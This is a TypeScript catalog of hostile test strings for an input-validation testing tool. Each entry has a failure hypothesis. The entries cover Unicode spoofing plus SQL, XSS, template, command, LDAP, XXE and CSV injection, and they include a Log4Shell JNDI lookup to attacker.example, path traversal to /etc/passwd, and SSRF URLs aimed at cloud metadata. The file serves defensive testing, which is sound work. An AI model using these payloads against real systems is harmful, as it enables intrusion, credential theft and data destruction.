import type { CatalogEntry } from './types.js'

/**
 * The curated catalog of hostile string inputs - the part of adversary that
 * encodes testing craft a generic generator or a random fuzzer does not ship.
 *
 * Every entry is explainable: a human can read `failureHypothesis` and decide
 * whether the case is worth keeping. Values are written with explicit `\u`
 * escapes and the source is kept ASCII-only on purpose - the exact code points
 * are the whole point, so we never rely on file encoding or editor normalization.
 */
export const catalog: CatalogEntry[] = [
  // -- Internationalization / Unicode -------------------------------------------------
  {
    value: 'café', // "cafe" + U+0301 combining acute = "cafe" in NFD form
    technique: 'i18n',
    family: 'unicode-normalization',
    failureHypothesis:
      'NFD form of "cafe" (e + combining acute). Looks identical to the NFC form but has a different length and byte sequence. Equality checks, uniqueness constraints, and index lookups fail unless input is normalized to a single form first.',
  },
  {
    value: '\u{1F468}‍\u{1F469}‍\u{1F467}‍\u{1F466}', // family emoji (ZWJ sequence)
    technique: 'i18n',
    family: 'grapheme-vs-codeunit',
    failureHypothesis:
      'A single family emoji built from a ZWJ sequence. One grapheme to the user, but String length is 11 UTF-16 code units. Length limits, truncation, and character counts disagree with what the user sees.',
  },
  {
    value: 'à́̂̃̄̅̆̇̈̉̊', // base + stacked combining marks
    technique: 'i18n',
    family: 'combining-marks',
    failureHypothesis:
      'A base letter followed by many stacked combining marks ("Zalgo"). Length far exceeds visible characters, which can overflow fixed-width fields, break layout, and trigger catastrophic backtracking in unbounded regexes.',
  },
  {
    value: 'ADMİN', // U+0130 = LATIN CAPITAL LETTER I WITH DOT ABOVE
    technique: 'i18n',
    family: 'locale-case-mapping',
    failureHypothesis:
      'Contains U+0130 (dotted capital I). Case conversion is locale-dependent - .toLowerCase() differs between the default locale and tr-TR - so case-insensitive comparisons against "admin" behave differently by environment and can wrongly match or wrongly reject.',
  },
  {
    value: 'report‮fdp.exe', // U+202E right-to-left override
    technique: 'i18n',
    family: 'bidi-override',
    failureHypothesis:
      'Embeds U+202E (right-to-left override), which visually reverses the following text so a stored "report<RLO>fdp.exe" renders as "reportexe.pdf". Spoofs filenames and labels in any UI that does not strip bidi controls.',
  },
  {
    value: 'аdmin', // U+0430 = Cyrillic small a, looks like ASCII "a"
    technique: 'i18n',
    family: 'homoglyph',
    failureHypothesis:
      'Leads with Cyrillic "a" (U+0430), which looks identical to ASCII "a". Reads as "admin" to a human but is a different string - bypasses denylists and enables username / domain lookalike spoofing.',
  },
  {
    value: 'ａｄｍｉｎ', // fullwidth "admin"
    technique: 'i18n',
    family: 'fullwidth-forms',
    failureHypothesis:
      'Fullwidth Latin letters that read as "admin" but are distinct code points. Bypasses keyword, profanity, and reserved-name filters that only match ASCII.',
  },
  {
    value: 'ad​min', // U+200B zero-width space between "ad" and "min"
    technique: 'i18n',
    family: 'invisible-whitespace',
    failureHypothesis:
      'Contains a zero-width space (U+200B). Invisible in the UI but changes the string, so it defeats equality and uniqueness checks, splits words for filters, and hides in stored data.',
  },
  {
    value: ' admin ', // U+00A0 non-breaking spaces around the value
    technique: 'i18n',
    family: 'non-breaking-space',
    failureHypothesis:
      'Wrapped in non-breaking spaces (U+00A0) that look like ordinary spaces but are a distinct code point. Trimming diverges across layers - JavaScript trim() strips U+00A0, but Postgres trim() and Java String.trim() do not - so the same value is trimmed in one tier and left padded in another, causing mismatched equality and duplicate records.',
  },
  {
    value: '\u{1D407}\u{1D41E}\u{1D425}\u{1D425}\u{1D428}', // mathematical-bold "Hello" (astral plane)
    technique: 'i18n',
    family: 'astral-plane',
    failureHypothesis:
      'Mathematical-bold "Hello" - every character lives outside the Basic Multilingual Plane (4-byte UTF-8). MySQL\'s 3-byte "utf8" charset silently corrupts or rejects them, and code-unit substring/regex operations split the surrogate pairs.',
  },
  {
    value: 'مرحبا', // Arabic "marhaba" (RTL)
    technique: 'i18n',
    family: 'rtl-text',
    failureHypothesis:
      'Right-to-left Arabic script. Exposes bidi layout, cursor, and truncation bugs, and mixed-direction concatenation that reorders unexpectedly when combined with Latin text and digits.',
  },
  {
    value: 'straße', // German "strasse" written with U+00DF eszett
    technique: 'i18n',
    family: 'case-mapping-expansion',
    failureHypothesis:
      'The German eszett. "ß".toUpperCase() is "SS", so uppercasing lengthens the string ("straße" becomes "STRASSE") and is not reversible. A case-insensitive comparison that uppercases both sides can match, but a length check on the uppercased value sees a different count, and an upper-then-lower round trip loses the original character.',
  },
  {
    value: 'ﬁle', // "file" with the U+FB01 "fi" ligature as its first code point
    technique: 'i18n',
    family: 'compatibility-normalization',
    failureHypothesis:
      'The "fi" ligature (U+FB01), a single code point. Under NFKC - which many identifier, search, and username pipelines apply - it decomposes to the two ASCII letters "fi", so the string silently changes length and content: it does not equal "file" before normalization but does after, so equality and uniqueness depend on whether and where NFKC ran.',
  },
  {
    value: 'ad\u00ADmin', // U+00AD soft hyphen between "ad" and "min"
    technique: 'i18n',
    family: 'soft-hyphen',
    failureHypothesis:
      'A soft hyphen (U+00AD) inside the word. It is invisible in most rendering but is a real code point, so it defeats equality and uniqueness checks, splits the word for a denylist or search index, and survives in stored data while still reading as "admin".',
  },
  {
    value: '\uFEFFadmin', // leading U+FEFF byte order mark
    technique: 'i18n',
    family: 'byte-order-mark',
    failureHypothesis:
      'A leading byte order mark (U+FEFF). It is zero-width, so the value looks like "admin" but is a distinct, longer string, and a BOM that reaches a parser is often mishandled - JSON.parse of a BOM-prefixed document throws in Node - so a value copied out of a BOM-prefixed file carries an invisible first character into equality and key comparisons.',
  },
  {
    value: 'line1\u2028line2', // U+2028 line separator
    technique: 'i18n',
    family: 'line-separator',
    failureHypothesis:
      'A Unicode line separator (U+2028). JavaScript and several parsers treat U+2028 and U+2029 as line terminators, so a value that looks like a single line splits across lines when embedded in source or written to a log, and older JSON-embedded-in-JS pipelines break on it outright.',
  },
  {
    value: 'user\uD800', // lone high surrogate U+D800 with no low surrogate
    technique: 'i18n',
    family: 'lone-surrogate',
    failureHypothesis:
      'A lone high surrogate (U+D800) with no low surrogate to pair with - not well-formed Unicode text. encodeURIComponent throws a URIError on it, TextEncoder replaces it with the U+FFFD replacement character, and some databases reject or mangle it, so a value that survives in a JS string can fail the moment it is URL-encoded, UTF-8 encoded, or stored.',
  },

  // -- Injection ----------------------------------------------------------------------
  {
    value: "' OR '1'='1' --",
    technique: 'injection',
    family: 'sql-injection',
    failureHypothesis:
      'Classic SQL tautology with a comment terminator. If the value reaches a query built by string concatenation, it can make a WHERE clause always-true and bypass authentication or filters.',
  },
  {
    value: "Robert'); DROP TABLE students; --",
    technique: 'injection',
    family: 'sql-injection',
    failureHypothesis:
      'A statement-terminating payload ("little Bobby Tables"). Against an unparameterized query it can execute a second, destructive statement.',
  },
  {
    value: '<script>alert(1)</script>',
    technique: 'injection',
    family: 'xss',
    failureHypothesis:
      "A script tag. If the value is later rendered into HTML without escaping, it executes in the viewer's browser (stored XSS).",
  },
  {
    value: '"><img src=x onerror=alert(1)>',
    technique: 'injection',
    family: 'xss',
    failureHypothesis:
      'Breaks out of an HTML attribute and fires an inline event handler. Catches contexts where a value is interpolated inside an attribute rather than element text.',
  },
  {
    value: '${7*7}',
    technique: 'injection',
    family: 'template-injection',
    failureHypothesis:
      'Template / expression syntax. If the value is interpolated into a server-side template that evaluates expressions, it can leak data or run code (SSTI). A response containing "49" confirms evaluation.',
  },
  {
    value: '../../../../etc/passwd',
    technique: 'injection',
    family: 'path-traversal',
    failureHypothesis:
      'Relative path escape. If the value is used to build a filesystem path (upload name, template lookup, static file), it can read or write outside the intended directory.',
  },
  {
    value: 'value\r\nSet-Cookie: admin=true',
    technique: 'injection',
    family: 'crlf-injection',
    failureHypothesis:
      'Embedded CR/LF. Forges extra lines in logs (log forging) and, if reflected into HTTP headers, splits the response to inject headers or content.',
  },
  {
    value: 'safe.jpg .exe', // U+0000 NUL byte
    technique: 'injection',
    family: 'null-byte',
    failureHypothesis:
      'Embedded NUL byte. Truncates the string in C-backed layers (filesystem, some native DB drivers) so an extension or content check that sees "safe.jpg" is defeated while the real path ends in ".exe".',
  },
  {
    value: '%s%s%s%s%n',
    technique: 'injection',
    family: 'format-string',
    failureHypothesis:
      'printf-style format tokens. In any layer that passes user input as a format string (some logging paths and native bindings), this can crash the process or leak memory.',
  },
  {
    value: "=cmd|'/c calc'!A1",
    technique: 'injection',
    family: 'csv-injection',
    failureHypothesis:
      'A spreadsheet formula. If the value is exported to CSV or XLSX and opened in Excel, Google Sheets, or LibreOffice, a leading =, +, -, or @ is evaluated as a formula rather than shown as text, which can exfiltrate other cells or run a command via DDE.',
  },
  {
    value: '${jndi:ldap://attacker.example/a}',
    technique: 'injection',
    family: 'jndi-injection',
    failureHypothesis:
      'A JNDI lookup expression, the Log4Shell shape (CVE-2021-44228). If the value is logged by a Java logging pipeline that performs message lookups, the ${jndi:...} is resolved and can load a remote class, turning a logged string into remote code execution.',
  },
  {
    value: '$(id)',
    technique: 'injection',
    family: 'command-injection',
    failureHypothesis:
      'Shell command substitution. If the value is interpolated into a shell command line (a spawned shell, backticks, os.system), $(id) runs as a separate command and its output is substituted, so an unsanitized value executes code on the host.',
  },
  {
    value: '*)(uid=*))(|(uid=*',
    technique: 'injection',
    family: 'ldap-injection',
    failureHypothesis:
      'An LDAP filter escape. If the value is concatenated into an LDAP search filter unescaped, the added parentheses and wildcards rewrite the filter so it matches every entry, bypassing an authentication or lookup filter.',
  },
  {
    value: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    technique: 'injection',
    family: 'xxe-injection',
    failureHypothesis:
      'An XML external entity declaration. If the value is parsed as XML by a parser with external entities enabled, the entity is expanded from file:///etc/passwd, disclosing local files (XXE), and a parameter-entity variant can reach internal network services.',
  },
]

/**
 * Format-aware packs. When a string field declares a `format`, the entries under
 * that key are injected in addition to the general catalog above, so the values
 * target that format's own parsers and consumers (an email field gets email
 * header-injection and homograph domains; a url field gets SSRF and scheme abuse).
 * Keyed by the JSON Schema `format` string Zod emits (email, uri, uuid, ...).
 * Community packs are welcome here - see CONTRIBUTING.md.
 */
export const packs: Record<string, CatalogEntry[]> = {
  // -- email (Zod z.email()) ----------------------------------------------------------
  email: [
    {
      value: 'a@b.co\r\nBcc: attacker@evil.test',
      technique: 'injection',
      family: 'crlf-header-injection',
      failureHypothesis:
        'A valid-looking address followed by a CRLF and an injected header. z.email() rejects the embedded CR/LF, but a looser hand-rolled check does not, and if the raw value is concatenated into a message\'s headers by a mail library, the injected line forges a Bcc, Reply-To, or Subject (email header injection).',
    },
    {
      value: 'user@xn--80ak6aa92e.com',
      technique: 'i18n',
      family: 'homograph-domain',
      failureHypothesis:
        'An internationalized domain in punycode (xn--) form. z.email() accepts it, so a domain that renders as a non-ASCII visual lookalike of a trusted one passes validation - spoofing the sender to a human, or slipping past a domain allowlist that only lists the ASCII original.',
    },
    {
      value: 'a'.repeat(65) + '@example.com',
      technique: 'BVA',
      family: 'oversized-local-part',
      failureHypothesis:
        'A local part of 65 characters. z.email() accepts it, but RFC 5321 caps the local part at 64 octets (and the whole path at 256), so a strict MTA or a fixed-width database column can reject or silently truncate an address your validator allowed, diverging on the same input.',
    },
    {
      value: 'user+adversary@example.com',
      technique: 'EP',
      family: 'plus-subaddressing',
      failureHypothesis:
        'A plus-address (subaddress). It is a valid, accepted address that most providers deliver to the same mailbox as the base address, so a per-address uniqueness constraint, block list, or one-signup-per-email rule that keys on the literal string is trivially bypassed with unlimited variants.',
    },
    {
      value: 'user@[127.0.0.1]',
      technique: 'EP',
      family: 'address-literal-ip',
      failureHypothesis:
        'An address literal with an IP host in brackets. z.email() rejects it, but RFC 5321 permits it, so a more permissive validator or MTA can accept it and attempt delivery straight to an IP address, bypassing domain-based routing and allow/deny lists.',
    },
    {
      value: 'user@example.com.',
      technique: 'EP',
      family: 'domain-trailing-dot',
      failureHypothesis:
        'A trailing dot on the domain, the DNS-absolute (rooted) form. z.email() rejects it, but DNS resolves example.com. and example.com to the same zone and some MTAs accept it, so a stricter-than-DNS validator refuses mail an MTA would deliver, while a looser one treats the same mailbox as two distinct addresses.',
    },
  ],

  // -- uri (Zod z.url()) --------------------------------------------------------------
  uri: [
    {
      value: 'javascript:alert(document.domain)',
      technique: 'injection',
      family: 'javascript-scheme',
      failureHypothesis:
        'A javascript: URL. z.url() accepts it (javascript is a valid URL scheme), so if the value is later used as an href, src, or window.open target without a scheme allowlist, it executes script in the page (XSS).',
    },
    {
      value: 'data:text/html,<script>alert(1)</script>',
      technique: 'injection',
      family: 'data-scheme',
      failureHypothesis:
        'A data: URL carrying HTML. z.url() accepts it, and where the app allows data: as a resource (an iframe or embed src, a download, or a non-strict context), the browser renders attacker-controlled content straight from the URL - a scheme many CSP and sanitizer configs overlook.',
    },
    {
      value: 'file:///etc/passwd',
      technique: 'injection',
      family: 'file-scheme',
      failureHypothesis:
        'A file:// URL. z.url() accepts it, so if the value is fetched server-side (an SSRF-style fetch, an image or PDF renderer, a webhook), it can read a local file instead of a remote resource.',
    },
    {
      value: 'http://169.254.169.254/latest/meta-data/',
      technique: 'injection',
      family: 'cloud-metadata-ssrf',
      failureHypothesis:
        'The cloud metadata endpoint (169.254.169.254). z.url() accepts it, so a server-side fetch of a user-supplied URL can read instance credentials and configuration from the metadata service - the classic SSRF-to-credential-theft path.',
    },
    {
      value: 'http://2130706433/',
      technique: 'injection',
      family: 'obfuscated-host',
      failureHypothesis:
        'The loopback address written as a 32-bit integer (2130706433 is 127.0.0.1). z.url() accepts it and the OS resolves it to localhost, so a string-based allow/deny list matching "127.0.0.1" or "localhost" is bypassed while the request still reaches the internal host (SSRF).',
    },
    {
      value: 'https://www.google.com@evil.test/',
      technique: 'injection',
      family: 'userinfo-host-confusion',
      failureHypothesis:
        'A URL whose authority puts a trusted-looking name in the userinfo, before the @, so the real host is evil.test. z.url() accepts it; a human or a naive check scanning for "google.com" is fooled while the browser or fetch connects to the host after the @.',
    },
    {
      value: 'http://localhost/',
      technique: 'injection',
      family: 'localhost-ssrf',
      failureHypothesis:
        'A URL pointing at the loopback host by name. z.url() accepts it, so a server-side fetch of a user-supplied URL reaches a service bound to localhost that was assumed unreachable from outside (SSRF), and the name form slips past allow/deny lists that only enumerate IP literals.',
    },
    {
      value: 'http://[::1]/',
      technique: 'injection',
      family: 'ipv6-loopback-ssrf',
      failureHypothesis:
        'The IPv6 loopback [::1], the IPv6 equal of 127.0.0.1. z.url() accepts it, so an SSRF filter that blocks only IPv4 loopback forms is bypassed while the request still reaches a local service on a dual-stack host.',
    },
    {
      value: 'http://xn--80ak6aa92e.com/',
      technique: 'i18n',
      family: 'idn-homograph-host',
      failureHypothesis:
        'A URL host as an internationalized (punycode) domain. z.url() accepts it, and the host can render as a non-ASCII visual lookalike of a trusted domain, so a link or an allowlist that a human or an ASCII-only check trusts actually points elsewhere.',
    },
  ],

  // -- uuid (Zod z.uuid()) ------------------------------------------------------------
  uuid: [
    {
      value: '00000000-0000-0000-0000-000000000000',
      technique: 'EP',
      family: 'nil-uuid',
      failureHypothesis:
        'The nil UUID (all zeros). z.uuid() accepts it as a valid UUID, but it is widely used as a sentinel for "none"/unset, so it can satisfy a required-UUID check yet collide with default rows, break a NOT-NULL-by-convention assumption, or match an uninitialized foreign key.',
    },
    {
      value: 'c232ab00-9414-11ec-b3c8-9f6bdeced846',
      technique: 'EP',
      family: 'non-random-version',
      failureHypothesis:
        'A version-1 UUID. z.uuid() accepts any version, not just v4, so if code treats a UUID as an unguessable token, this passes validation though it encodes a timestamp and MAC address and is largely predictable - not the randomness the code assumed.',
    },
    {
      value: '550E8400-E29B-41D4-A716-446655440000',
      technique: 'EP',
      family: 'uuid-uppercase',
      failureHypothesis:
        'An uppercase UUID. z.uuid() accepts it, but layers disagree on case: PostgreSQL normalizes UUIDs to lowercase on storage while a string comparison or cache key is case-sensitive, so the same UUID can miss a lookup or create a duplicate across tiers.',
    },
    {
      value: 'ffffffff-ffff-ffff-ffff-ffffffffffff',
      technique: 'BVA',
      family: 'max-uuid',
      failureHypothesis:
        'The max UUID (all f). z.uuid() accepts it; a valid but extreme value that can special-case in code using UUIDs as sort keys or range bounds, and pairs with the nil UUID as the two boundary sentinels.',
    },
    {
      value: '550e8400e29b41d4a716446655440000',
      technique: 'EP',
      family: 'uuid-hyphenless',
      failureHypothesis:
        'The 32-hex form with no hyphens. z.uuid() rejects it, but many libraries and databases accept or emit the unhyphenated form, so a UUID produced by another system can round-trip back as invalid, or two representations of the same UUID compare unequal.',
    },
    {
      value: '{550e8400-e29b-41d4-a716-446655440000}',
      technique: 'EP',
      family: 'uuid-braced',
      failureHypothesis:
        'The brace-wrapped form. z.uuid() rejects it, but .NET Guid.ToString("B") emits exactly this, so a UUID crossing a .NET boundary arrives in a shape your validator refuses even though it denotes the same value.',
    },
  ],
}
